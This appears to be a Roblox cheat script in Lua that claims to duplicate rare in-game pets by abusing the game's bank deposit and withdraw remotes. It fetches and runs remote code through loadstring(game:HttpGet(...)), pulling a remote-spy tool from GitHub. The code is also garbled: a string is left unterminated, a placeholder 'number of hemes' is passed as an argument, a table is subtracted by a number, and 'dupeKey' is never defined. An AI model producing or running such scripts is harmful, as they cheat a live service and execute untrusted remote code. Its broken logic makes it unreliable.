local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 
local mybanks = lib.Network.Invoke("get my banks")
local BankID = mybanks[1]['BUID']
setclipboard(BankID)

local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end

loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua))()

local args = {
    [1] = {
        [1] = "BankID",
        [2] = {},
        [3] = number of hemes
    }
}
workspace.THINGS.REMOTES:FindFirstChild("bank deposit"):InvokeServer(unpack(args))

local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList - 1);
if request then
    lib.Message.New("DUPE IS STARTING");
else
    lib.Message.New(request2 and "please be patient!");
    return;
end
if lib.Network.Invoke("Bank Withdraw", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("DUPE HAS BEEN SUCCESFULLY INITIATED");
else
    lib.Message.New("DUPED FAILED, PLEASE TRY AGAIN.");
end;
